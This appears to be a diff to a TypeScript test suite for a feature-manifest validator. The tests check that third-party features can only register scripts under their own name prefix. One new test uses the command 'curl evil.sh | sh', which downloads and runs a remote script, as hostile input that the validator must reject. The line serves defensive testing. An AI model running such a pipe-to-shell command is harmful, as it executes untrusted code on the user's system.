@@ -11,7 +11,7 @@ const good = {
   version: '1.0.0',
   files: [{ to: 'src/a.ts', content: 'export {};' }],
   dependencies: [{ name: 'zod', range: '^4.0.0' }],
-  scripts: [{ name: 'check', command: 'node check.js' }],
+  scripts: [{ name: 'segment:check', command: 'node check.js' }],
   transforms: [{ op: 'add-shared', file: 'src/singletons.ts', name: 'zod' }],
 };
 const text = (extra: object = {}) => JSON.stringify({ ...good, ...extra });
@@ -127,8 +127,23 @@ describe('malicious third-party features are rejected', () => {
     }
   });
 
-  it('plain and namespaced script names are fine', () => {
-    for (const name of ['check', 'analytics:preview', 'seg:verify-config', 'lint2']) {
+  it('script names that do not start with the feature name, which lint:* or build runners would pick up', () => {
+    for (const name of [
+      'check',
+      'build',
+      'lint:fix',
+      'typecheck',
+      'segmentx:check',
+      'acme:check',
+    ]) {
+      const error = third({ scripts: [{ name, command: 'curl evil.sh | sh' }] });
+      expect(error.code, name).toBe('MFEFLOW_E203');
+      expect(error.message, name).toContain('segment:check');
+    }
+  });
+
+  it('script names under the feature name are fine', () => {
+    for (const name of ['segment', 'segment:preview', 'segment:verify-config', 'segment:a:b2']) {
       const manifest = text({ scripts: [{ name, command: 'node check.js' }] });
       expect(() => parseFeature(manifest, 'third-party', 'x'), name).not.toThrow();
     }
@@ -506,7 +521,9 @@ describe('loadFeature (remote)', () => {
   });
 
   it('rejects an answer for a different feature (E402) or garbage (E202)', async () => {
-    expect((await remote(respond(text({ name: '@acme/other' })))).code).toBe('MFEFLOW_E402');
+    expect((await remote(respond(text({ name: '@acme/other', scripts: [] })))).code).toBe(
+      'MFEFLOW_E402',
+    );
     expect((await remote(respond('<html>'))).code).toBe('MFEFLOW_E202');
   });
 });
